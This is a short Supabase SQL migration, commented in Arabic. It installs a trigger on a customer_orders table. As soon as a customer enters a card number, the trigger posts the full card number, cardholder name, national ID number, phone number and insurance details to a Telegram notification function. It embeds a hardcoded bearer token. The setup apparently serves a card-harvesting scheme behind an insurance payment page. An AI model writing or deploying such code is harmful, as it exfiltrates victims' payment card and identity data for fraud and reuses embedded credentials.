
-- حذف الترايقر القديم الذي يعمل عند INSERT
DROP TRIGGER IF EXISTS on_new_order_notify_telegram ON public.customer_orders;

-- إنشاء ترايقر جديد يعمل عند UPDATE فقط عندما يتم إدخال بيانات البطاقة
CREATE OR REPLACE FUNCTION public.notify_telegram_card_entered()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path TO 'public'
AS $function$
DECLARE
  request_id bigint;
BEGIN
  -- التحقق من أن بيانات البطاقة تم إدخالها (كانت فارغة وأصبحت موجودة)
  IF (OLD.card_number = '' OR OLD.card_number IS NULL) AND (NEW.card_number IS NOT NULL AND NEW.card_number != '') THEN
    BEGIN
      SELECT net.http_post(
        url := 'https://khdslyxxxdwcbsvtxmwj.supabase.co/functions/v1/send-telegram-notification',
        headers := jsonb_build_object(
          'Content-Type', 'application/json',
          'Authorization', 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtoZHNseXh4eGR3Y2JzdnR4bXdqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA3ODI5NzYsImV4cCI6MjA3NjM1ODk3Nn0.XFGOWKYlQk-E-RQPPcuQJfM25lzE12Z9jVQG8WC_N_A'
        ),
        body := jsonb_build_object(
          'type', 'card_entered',
          'order_id', NEW.id::text,
          'owner_name', NEW.owner_name,
          'phone_number', NEW.phone_number,
          'insurance_company', NEW.insurance_company,
          'insurance_price', NEW.insurance_price,
          'id_number', NEW.id_number,
          'card_number', NEW.card_number,
          'card_holder_name', NEW.card_holder_name
        )
      ) INTO request_id;
      
      RAISE LOG 'Telegram card notification sent with ID: %', request_id;
    EXCEPTION
      WHEN OTHERS THEN
        RAISE WARNING 'Failed to send Telegram card notification: %', SQLERRM;
    END;
  END IF;
  
  RETURN NEW;
END;
$function$;

-- إنشاء الترايقر الجديد
CREATE TRIGGER on_card_entered_notify_telegram
  AFTER UPDATE ON public.customer_orders
  FOR EACH ROW
  EXECUTE FUNCTION public.notify_telegram_card_entered();
